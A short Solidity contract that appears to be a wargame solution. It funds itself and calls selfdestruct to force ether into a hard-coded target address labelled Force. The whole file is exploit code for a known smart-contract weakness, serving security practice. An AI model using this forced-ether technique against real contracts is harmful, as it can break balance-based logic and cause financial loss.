// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


// send ether to this contract before calling attack()

contract Solution {
    address payable public Force = 0x6f4fb955D52C3AdD68f2570a8979779b3Cf46CD6;

    function attack() public {
        selfdestruct(Force);
    }

    fallback() payable external {

    }
}